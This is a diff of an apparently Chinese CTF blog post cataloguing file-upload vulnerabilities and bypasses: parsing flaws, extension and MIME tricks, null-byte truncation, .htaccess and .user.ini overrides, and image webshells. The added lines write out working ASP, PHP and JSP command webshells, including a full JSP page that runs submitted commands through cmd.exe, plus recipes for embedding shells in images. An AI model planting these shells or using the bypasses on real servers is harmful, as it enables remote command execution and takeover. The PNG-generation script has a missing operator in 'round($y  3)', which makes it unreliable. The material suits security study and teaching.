@@ -21,20 +21,21 @@
     <meta name="keywords" content="hexo,HackerQWQ,blog,CTFer">
     
     <meta name="description" content="">
-    <meta name="description" content="2020.6.11第一次更新前言：上传漏洞，简单来说，就是后端对用户上传上来的文件没有做好格式验证和内容检测，导致用户可以上传任意文件。 解析漏洞常见的Web容器有IIS、Nginx、Apache、Tomcat等 IIS解析漏洞IIS6.0版本存在两个解析漏洞，然而官方并不认为这是漏洞，因此这个漏洞现在依然存在。 1..asp、.asa后缀的文件夹当建立*.asa、*.asp格式的文件夹时，其下的">
+    <meta name="description" content="2020.6.11第一次更新前言：上传漏洞，简单来说，就是后端对用户上传上来的文件没有做好格式验证和内容检测，导致用户可以上传任意文件。 解析漏洞常见的Web容器有IIS、Nginx、Apache、Tomcat等 IIS6.0解析漏洞IIS6.0版本存在两个解析漏洞，然而官方并不认为这是漏洞，因此这个漏洞现在依然存在。 .asp、.asa后缀的文件夹当建立*.asa、*.asp格式的文件夹时，其下">
 <meta property="og:type" content="article">
 <meta property="og:title" content="文件上传漏洞知识点整理">
 <meta property="og:url" content="https://hackerqwq.github.io/2020/06/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="2020.6.11第一次更新前言：上传漏洞，简单来说，就是后端对用户上传上来的文件没有做好格式验证和内容检测，导致用户可以上传任意文件。 解析漏洞常见的Web容器有IIS、Nginx、Apache、Tomcat等 IIS解析漏洞IIS6.0版本存在两个解析漏洞，然而官方并不认为这是漏洞，因此这个漏洞现在依然存在。 1..asp、.asa后缀的文件夹当建立*.asa、*.asp格式的文件夹时，其下的">
+<meta property="og:description" content="2020.6.11第一次更新前言：上传漏洞，简单来说，就是后端对用户上传上来的文件没有做好格式验证和内容检测，导致用户可以上传任意文件。 解析漏洞常见的Web容器有IIS、Nginx、Apache、Tomcat等 IIS6.0解析漏洞IIS6.0版本存在两个解析漏洞，然而官方并不认为这是漏洞，因此这个漏洞现在依然存在。 .asp、.asa后缀的文件夹当建立*.asa、*.asp格式的文件夹时，其下">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://hackerqwq.github.io/2020/06/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/1.png">
 <meta property="og:image" content="https://hackerqwq.github.io/2020/06/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/2.png">
+<meta property="og:image" content="https://oss-emcsprod-public.modb.pro/wechatSpider/modb_20210628_3e10de70-d7de-11eb-8d0e-00163e068ecd.png">
 <meta property="og:image" content="https://hackerqwq.github.io/2020/06/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/3.png">
 <meta property="og:image" content="https://hackerqwq.github.io/2020/06/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/Users/78574/AppData/Roaming/Typora/typora-user-images/image-20211118233211039.png">
 <meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20211115222450175.png">
 <meta property="article:published_time" content="2020-06-11T13:32:36.000Z">
-<meta property="article:modified_time" content="2021-11-18T15:32:56.280Z">
+<meta property="article:modified_time" content="2022-08-20T06:20:49.536Z">
 <meta property="article:author" content="HacKerQWQ">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="文件上传漏洞">
@@ -295,7 +296,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">3k</span>Reading time: <span class="post-count reading-time">12 min</span></span>
+                        <span>Word count: <span class="post-count word-count">3.8k</span>Reading time: <span class="post-count reading-time">16 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -427,13 +428,13 @@ height:50vh;
     <article class="article-entry">
         <p>2020.6.11第一次更新<br>前言：上传漏洞，简单来说，就是后端对用户上传上来的文件没有做好格式验证和内容检测，导致用户可以上传任意文件。</p>
 <h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><p>常见的Web容器有<strong>IIS、Nginx、Apache、Tomcat</strong>等</p>
-<h2 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h2><p>IIS6.0版本存在两个解析漏洞，然而官方并不认为这是漏洞，因此这个漏洞现在依然存在。</p>
-<h3 id="1-asp、-asa后缀的文件夹"><a href="#1-asp、-asa后缀的文件夹" class="headerlink" title="1..asp、.asa后缀的文件夹"></a>1.<em>.asp、</em>.asa后缀的文件夹</h3><p>当建立*.asa、*.asp格式的文件夹时，其下的任意文件都会被当成asp文件来执行。</p>
+<h2 id="IIS6-0解析漏洞"><a href="#IIS6-0解析漏洞" class="headerlink" title="IIS6.0解析漏洞"></a>IIS6.0解析漏洞</h2><p>IIS6.0版本存在两个解析漏洞，然而官方并不认为这是漏洞，因此这个漏洞现在依然存在。</p>
+<h3 id="asp、-asa后缀的文件夹"><a href="#asp、-asa后缀的文件夹" class="headerlink" title=".asp、.asa后缀的文件夹"></a><em>.asp、</em>.asa后缀的文件夹</h3><p>当建立*.asa、*.asp格式的文件夹时，其下的任意文件都会被当成asp文件来执行。</p>
 <p><strong><em>example</em></strong>:<br>建立文件夹<strong>parsing.asp</strong>和其下文件test.txt(test.txt的内容是&lt;%=NOW()%&gt;)</p>
 <p><img src="/2020/06/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/1.png"></p>
 <p>分析：一般来说IIS是不会解析<strong>TXT</strong>类型的文件的，而是直接显示文件内容，然而在<strong>parsing.asp</strong>文件夹下确直接执行了**NOW()**函数。</p>
-<h3 id="2-aps-1-jpg格式的文件"><a href="#2-aps-1-jpg格式的文件" class="headerlink" title="2.*.aps;1.jpg格式的文件"></a>2.*.aps;1.jpg格式的文件</h3><p>当文件是*.asp;1.jpg,内容为&lt;%=NOW()%&gt;时，同样会被当做ASP脚本执行，效果同上。</p>
-<h3 id="3-拓展WebDav"><a href="#3-拓展WebDav" class="headerlink" title="3.拓展WebDav"></a>3.拓展WebDav</h3><p>简介：WebDav(Web-based Distributed Authoring and Versioning)是基于HTTP1.1的通信协议，拓展了HTTP协议，在<strong>GET、POST、HEAD</strong>等几个常见的HTTP方法之外新增了<strong>PUT、Delete、Move、Copy</strong>等方法</p>
+<h3 id="aps-1-jpg格式的文件"><a href="#aps-1-jpg格式的文件" class="headerlink" title="*.aps;1.jpg格式的文件"></a>*.aps;1.jpg格式的文件</h3><p>当文件是*.asp;1.jpg,内容为&lt;%=NOW()%&gt;时，同样会被当做ASP脚本执行，效果同上。</p>
+<h3 id="拓展WebDav"><a href="#拓展WebDav" class="headerlink" title="拓展WebDav"></a>拓展WebDav</h3><p>简介：WebDav(Web-based Distributed Authoring and Versioning)是基于HTTP1.1的通信协议，拓展了HTTP协议，在<strong>GET、POST、HEAD</strong>等几个常见的HTTP方法之外新增了<strong>PUT、Delete、Move、Copy</strong>等方法</p>
 <p><strong><em>只要使用IIS(6.0)并且拓展了WebDav协议的话，就存在十分危险的上传漏洞</em></strong></p>
 <p>步骤分为以下几步：</p>
 <ul>
@@ -465,7 +466,12 @@ height:50vh;
 <ul>
 <li>在新版本的php中加入了<code>  security.limit_extensions</code>参数限制默认解析的php脚本后缀为php,除非自主添加</li>
 </ul>
-<h1 id="绕过上传漏洞"><a href="#绕过上传漏洞" class="headerlink" title="绕过上传漏洞"></a>绕过上传漏洞</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p><strong>PHP</strong>:    <img src="/2020/06/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/2.png"><br><strong>ASP</strong>:    &lt;%eval request(“hello”)%&gt;<br><strong>ASP.NET</strong>:    &lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[‘hello’],’unsafe’);%&gt;</p>
+<h1 id="绕过上传漏洞"><a href="#绕过上传漏洞" class="headerlink" title="绕过上传漏洞"></a>绕过上传漏洞</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># ASP</span><br><span class="line">&lt;% eval request(&quot;cmd&quot;) %&gt;</span><br><span class="line"># PHP</span><br><span class="line">&lt;?php echo passthru($_GET[&#39;cmd&#39;]); ?&gt;</span><br><span class="line">&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]); ?&gt;</span><br><span class="line"># JSP</span><br><span class="line">&lt;% Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)); %&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>PHP</strong>:    <img src="/2020/06/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/2.png"><br><strong>ASP</strong>:    &lt;%eval request(“hello”)%&gt;<br><strong>ASP.NET</strong>:    &lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[‘hello’],’unsafe’);%&gt;</p>
+<p><strong>Java</strong>：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.*,java.io.*,java.net.*&quot;</span>%&gt;</span><br><span class="line">&lt;HTML&gt;&lt;BODY&gt;</span><br><span class="line">&lt;FORM METHOD=<span class="string">&quot;POST&quot;</span> NAME=<span class="string">&quot;myform&quot;</span> ACTION=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">    &lt;INPUT TYPE=<span class="string">&quot;text&quot;</span> NAME=<span class="string">&quot;cmd&quot;</span>&gt;</span><br><span class="line">    &lt;INPUT TYPE=<span class="string">&quot;submit&quot;</span> VALUE=<span class="string">&quot;Send&quot;</span>&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="comment">//    response.setCharacterEncoding(&quot;GBK&quot;);</span></span><br><span class="line">    <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        out.println(<span class="string">&quot;Command: &quot;</span> + request.getParameter(<span class="string">&quot;cmd&quot;</span>) + <span class="string">&quot;\n&lt;BR&gt;&quot;</span>);</span><br><span class="line">        Process p = Runtime.getRuntime().exec(<span class="string">&quot;cmd.exe /c &quot;</span> + request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">        OutputStream os = p.getOutputStream();</span><br><span class="line">        InputStream in = p.getInputStream();</span><br><span class="line">        <span class="keyword">char</span>[] strings = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> len = -<span class="number">1</span>;</span><br><span class="line">        InputStreamReader reader = <span class="keyword">new</span> InputStreamReader(in,<span class="string">&quot;gbk&quot;</span>);</span><br><span class="line">        StringBuilder builder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">while</span>((len=reader.read(strings))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            builder.append(strings);</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(builder);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/BODY&gt;&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
+
 <h2 id="客户端检测"><a href="#客户端检测" class="headerlink" title="客户端检测"></a>客户端检测</h2><p>1.<strong>FireBug</strong>，这款工具据我了解就是现在<strong>FireFox</strong>的集成工具F12(万能的F12)</p>
 <p>具体操作：通过<strong>FireBug</strong>将页面中绑定的<strong>JS</strong>操作解除，但是一般行不通，因为浏览器在渲染页面的时候已经将JS与按钮绑定了，再修改也起不到作用，修改长度则可以</p>
 <p>2.中间人攻击</p>
@@ -475,7 +481,7 @@ height:50vh;
 <h3 id="白名单与黑名单验证"><a href="#白名单与黑名单验证" class="headerlink" title="白名单与黑名单验证"></a>白名单与黑名单验证</h3><h4 id="黑名单过滤"><a href="#黑名单过滤" class="headerlink" title="黑名单过滤"></a>黑名单过滤</h4><p>所谓黑名单过滤就是过滤掉一些拓展名在黑名单列表的文件</p>
 <p>绕过方式：</p>
 <p><strong>Num.1</strong>：尝试黑名单里面没有列到的拓展名，例如cer、php5等等</p>
-<p><strong>Num.2</strong>：有些<strong>upload.php</strong>没有对上传的文件拓展名进行大小写的转换，那就意味着可以上传<strong>Php</strong>、<strong>Asp</strong>这样的文件，而此类拓展名在**<em>Windows**</em>平台依然会被Web容器解析</p>
+<p><strong>Num.2</strong>：有些<strong>upload.php</strong>没有对上传的文件拓展名进行大小写的转换，那就意味着可以上传<strong>php</strong>、<strong>asp</strong>这样的文件，而此类拓展名在**<em>Windows**</em>平台依然会被Web容器解析</p>
 <p><strong>Num.3</strong>：在<strong>Windows</strong>系统下，如果文件是以**”.”<strong>或者</strong>空格**结尾的话，系统会自动去除</p>
 <p>比如说可以上传**”.asp.”<strong>或者</strong>“.php “<strong>这样的文件，服务端在接收文件之后，</strong>Windows**系统会自动去除小数点和空格</p>
 <p>因此，黑名单是不安全的，未知的风险太多</p>
@@ -488,18 +494,34 @@ height:50vh;
 <p>只要将它修改为</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span>: image/jpeg</span><br></pre></td></tr></table></figure>
 <p>就可以通过程序的验证</p>
+<p>常见MIME类型：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">超文本标记语言文本 .html text&#x2F;html</span><br><span class="line"></span><br><span class="line">xml文档 .xml text&#x2F;xml</span><br><span class="line"></span><br><span class="line">XHTML文档 .xhtml application&#x2F;xhtml+xml</span><br><span class="line"></span><br><span class="line">普通文本 .txt text&#x2F;plain</span><br><span class="line"></span><br><span class="line">RTF文本 .rtf application&#x2F;rtf</span><br><span class="line"></span><br><span class="line">PDF文档 .pdf application&#x2F;pdf</span><br><span class="line"></span><br><span class="line">Microsoft Word文件 .word application&#x2F;msword</span><br><span class="line"></span><br><span class="line">PNG图像 .png image&#x2F;png</span><br><span class="line"></span><br><span class="line">GIF图形 .gif image&#x2F;gif</span><br><span class="line"></span><br><span class="line">JPEG图形 .jpeg,.jpg image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">au声音文件 .au audio&#x2F;basic</span><br><span class="line"></span><br><span class="line">MIDI音乐文件 mid,.midi audio&#x2F;midi,audio&#x2F;x-midi</span><br><span class="line"></span><br><span class="line">RealAudio音乐文件 .ra, .ram audio&#x2F;x-pn-realaudio</span><br><span class="line"></span><br><span class="line">MPEG文件 .mpg,.mpeg video&#x2F;mpeg</span><br><span class="line"></span><br><span class="line">AVI文件 .avi video&#x2F;x-msvideo</span><br><span class="line"></span><br><span class="line">GZIP文件 .gz application&#x2F;x-gzip</span><br><span class="line"></span><br><span class="line">TAR文件 .tar application&#x2F;x-tar</span><br></pre></td></tr></table></figure>
+
+<p>更多MIME格式：<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/media/media_mimeref.asp">https://www.w3school.com.cn/media/media_mimeref.asp</a></p>
 <h3 id="目录验证"><a href="#目录验证" class="headerlink" title="目录验证"></a>目录验证</h3><p>当你上传的指定目录不存在时，有些程序员会为了代码的健壮性，新建一个目录让你放文件，其实这是很危险的</p>
 <p>假如服务器使用的是<strong>IIS6.0</strong>的Web容器，而此时你要上传的目录是<strong>test.php</strong>，那无论上传任何文件都能被当做脚本执行，更别说是一句话木马了</p>
-<h3 id="截断上传攻击"><a href="#截断上传攻击" class="headerlink" title="截断上传攻击"></a>截断上传攻击</h3><p>截断上传攻击在<strong>ASP</strong>、<strong>PHP</strong>、<strong>JSP</strong>都存在这样的问题，<strong>ASP</strong>较为常见</p>
+<h3 id="截断上传攻击"><a href="#截断上传攻击" class="headerlink" title="截断上传攻击"></a>截断上传攻击</h3><p>前提条件：</p>
+<ul>
+<li>php 版本小于 5.3.4</li>
+<li>php的magic_quotes_gpc为OFF状态</li>
+</ul>
+<p>截断上传攻击在<strong>ASP</strong>、<strong>PHP</strong>、<strong>JSP</strong>都存在这样的问题，<strong>ASP</strong>较为常见</p>
 <p>具体演示：将上传的文件名称改为<strong>test.php(空格)1.jpg</strong>然后在Hex表里面将20改为00</p>
 <p>原理：当程序输出%00的时候会将它作为数据流结束的信号，因此后面的内容不会被读取到</p>
 <h2 id="文本编辑器上传漏洞"><a href="#文本编辑器上传漏洞" class="headerlink" title="文本编辑器上传漏洞"></a>文本编辑器上传漏洞</h2><p>常见的文本编辑器有<strong>CKEditor</strong>、<strong>Ewebeditor</strong>、<strong>UEditor</strong>、<strong>KindEditor</strong>、<strong>XHeditor</strong>等，这些编辑器的功能差不多，都有图片上传、视频上传、远程下载等功能</p>
 <p>优点：方便、集成性好<br>缺点：一旦有漏洞，使用这款文本编辑器的服务器就呵呵了</p>
 <p>以<strong>FCKeditor</strong>(现为<strong>CKEditor</strong>)为例子：<br>1.目录存在敏感信息泄露问题<br>2.版本低于2.43采用了黑名单策略，忽略了asa、cer等危险脚本文件<br>3.任意文件上传漏洞(2.42及以下)<br>只要在请求文件的后面加上**/Type=Media**就可以上传任意文件</p>
 <p>从这些例子可以看出，使用文本编辑器一旦有漏洞，造成的后果不堪设想~</p>
-<h2 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h2><p>1.先上传**.user.ini<strong>或者</strong>.htaccess<strong>文件改变用户策略<br>2.**Windows</strong>系统下文件名后面的冒号、文件名后面加::$DATA都会被过滤<br>例如：<br><strong>shell.php:1.jpg</strong><br><strong>Shell.php::$DATA</strong></p>
+<h2 id="针对Windows系统绕过"><a href="#针对Windows系统绕过" class="headerlink" title="针对Windows系统绕过"></a>针对Windows系统绕过</h2><h3 id="上传未限制后缀的文件"><a href="#上传未限制后缀的文件" class="headerlink" title="上传未限制后缀的文件"></a>上传未限制后缀的文件</h3><p>简单来说，就是fuzz后缀，没有限制什么就上传什么</p>
+<h3 id="大小写混合绕过"><a href="#大小写混合绕过" class="headerlink" title="大小写混合绕过"></a>大小写混合绕过</h3><p>windows 系统中的特性，文件的文件名大小写组合也可以运行，是不区分大小写的，所以在一些上传点中，例如黑名单禁止 x.php 上传，就可以构造 x.Php 等文件，上传到服务器之后 x.Php 在 windows 系统中仍然会以 php 文件来处理执行。</p>
+<h3 id="末尾添加-绕过"><a href="#末尾添加-绕过" class="headerlink" title="末尾添加.绕过"></a>末尾添加.绕过</h3><p>在某些环境中可以使用 x.php. 文件绕过上传，文件上传到 windows 服务器后，会根据 windows 特有的机制在保存文件是将文件结尾的 . 去掉，这样既绕过里上传限制，也保存下来里 x.php 文件（结尾加 . 可以与双写或大小写混用，但是仅限 windows 系统）。</p>
+<h3 id="末尾添加空格绕过"><a href="#末尾添加空格绕过" class="headerlink" title="末尾添加空格绕过"></a>末尾添加空格绕过</h3><p>上传文件是使用 burpsuite 抓包在结尾处添加空格即可，windows 会在保存文件时将空格去掉。</p>
+<p><img src="https://oss-emcsprod-public.modb.pro/wechatSpider/modb_20210628_3e10de70-d7de-11eb-8d0e-00163e068ecd.png" alt="img"></p>
+<h3 id="末尾添加-DATA绕过"><a href="#末尾添加-DATA绕过" class="headerlink" title="末尾添加::$DATA绕过"></a>末尾添加::$DATA绕过</h3><p><code>::$DATA</code> 是 windows 的 NTFS 文件系统中的一种机制，当文件名结尾为 <code>::$DATA</code> 则触发，但是最终保存下来的文件名是不带 <code>::$DATA</code> 的，从而绕过黑名单限制上传。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell.php:1.jpg</span><br><span class="line">Shell.php::$DATA</span><br></pre></td></tr></table></figure>
+
 <h2 id="修复上传漏洞"><a href="#修复上传漏洞" class="headerlink" title="修复上传漏洞"></a>修复上传漏洞</h2><p>1.过滤上传目录<br>2.文件重命名<br>3.对文件内容进行审查</p>
-<p> —2020.8.7</p>
+<p>4.对文件后缀进行审查</p>
 <h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch 1.jpg&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
 
 <h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=1.jpg</span><br></pre></td></tr></table></figure>
@@ -532,9 +554,27 @@ height:50vh;
 <td align="center">42 4D</td>
 </tr>
 </tbody></table>
-<h2 id="后缀绕过"><a href="#后缀绕过" class="headerlink" title="后缀绕过"></a>后缀绕过</h2><p>php由于历史原因，部分解释器可能支持符合正则 <code>/ph(p[2-7]?|t(ml)?)/</code> 的后缀，如 <code>php</code> / <code>php5</code> / <code>pht</code> / <code>phtml</code> / <code>shtml</code> / <code>pwml</code> / <code>phtm</code> 等 可在禁止上传php文件时测试该类型。</p>
+<h2 id="冷门后缀绕过"><a href="#冷门后缀绕过" class="headerlink" title="冷门后缀绕过"></a>冷门后缀绕过</h2><p>php由于历史原因，部分解释器可能支持符合正则 <code>/ph(p[2-7]?|t(ml)?)/</code> 的后缀，如 <code>php</code> / <code>php5</code> / <code>pht</code> / <code>phtml</code> / <code>shtml</code> / <code>pwml</code> / <code>phtm</code> 等 可在禁止上传php文件时测试该类型。</p>
 <p>jsp引擎则可能会解析 <code>jspx</code> / <code>jspf</code> / <code>jspa</code> / <code>jsw</code> / <code>jsv</code> / <code>jtml</code> 等后缀，asp支持 <code>asa</code> / <code>asax</code> / <code>cer</code> / <code>cdx</code> / <code>aspx</code> / <code>ascx</code> / <code>ashx</code> / <code>asmx</code> / <code>asp&#123;80-90&#125;</code> 等后缀。</p>
 <p>除了这些绕过，其他的后缀同样可能带来问题，如 <code>vbs</code> / <code>asis</code> / <code>sh</code> / <code>reg</code> / <code>cgi</code> / <code>exe</code> / <code>dll</code> / <code>com</code> / <code>bat</code> / <code>pl</code> / <code>cfc</code> / <code>cfm</code> / <code>ini</code> 等。</p>
+<h2 id="图片马配合文件包含漏洞绕过"><a href="#图片马配合文件包含漏洞绕过" class="headerlink" title="图片马配合文件包含漏洞绕过"></a>图片马配合文件包含漏洞绕过</h2><ul>
+<li>简易版本,GIF图片马</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">phpinfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>copy生成图片马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy file.png&#x2F;b+shell.php&#x2F;a shell.png</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>php生成图片马</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//png.php</span></span><br><span class="line"></span><br><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0xe</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>, <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>, <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>, <span class="number">0x5a</span>, <span class="number">0x1</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x1</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>, <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>, <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>, <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line"></span><br><span class="line">   $r = $p[$y];</span><br><span class="line"></span><br><span class="line">   $g = $p[$y+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">   $b = $p[$y+<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line"></span><br><span class="line">   imagesetpixel($img, round($y  <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,<span class="string">&#x27;./pass17.png&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>生成图片马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php payload.php  file.png</span><br></pre></td></tr></table></figure>
+
+<p>file.png为普通图片，生成的pass17.png为图片马</p>
